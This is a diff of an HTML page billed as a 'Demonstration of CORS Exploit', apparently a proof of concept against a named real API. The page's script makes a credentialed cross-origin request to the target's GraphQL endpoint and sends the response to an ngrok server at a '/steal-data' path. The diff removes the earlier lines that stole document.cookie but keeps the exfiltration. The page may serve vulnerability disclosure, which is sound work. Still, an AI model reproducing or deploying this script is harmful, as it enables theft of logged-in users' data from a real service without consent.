@@ -8,32 +8,27 @@
 <body>
     <h1><u>Demonstration of CORS Exploit</u></h1>
 <script>
-    // Capture the user's cookies
-    const userCookies = document.cookie;
-
-    // Make a request to the vulnerable API
+    // Make a request to the vulnerable API on worldcoin.org
     fetch('https://api.consumer.worldcoin.org/v1/graphql', {
         method: 'POST',
-        credentials: 'include',
+        credentials: 'include',  // Include cookies in the request
         headers: {
             'Content-Type': 'application/json',
-            'Origin': 'https://kripto-geek.github.io/cors-exploit-demo/' 
+            'Origin': 'https://kripto-geek.github.io/cors-exploit-demo/'  // Set your domain
         },
-        body: JSON.stringify({ query: `{ publicData { id name } }` })
+        body: JSON.stringify({ query: `{ validQueryHere { id name } }` })  // Replace with a valid query
     })
     .then(response => response.text())
     .then(data => {
-        // Send the cookies and response data to your server
+        console.log('API Response:', data);  // Debugging
+        // Send the API response data to your server
         fetch('https://827b-2401-4900-1c82-da4e-3a56-a4c3-7e9-3a2d.ngrok-free.app/steal-data', {
             method: 'POST',
-            body: JSON.stringify({ cookies: userCookies, response: data }),
             headers: {
                 'Content-Type': 'application/json'
-            }
-        })
-        .then(res => res.text())
-        .then(serverResponse => console.log('Server received:', serverResponse))
-        .catch(error => console.error('Error sending data to server:', error));
+            },
+            body: JSON.stringify({ response: data })
+        });
     })
     .catch(error => console.error('Error fetching API:', error));
 </script>
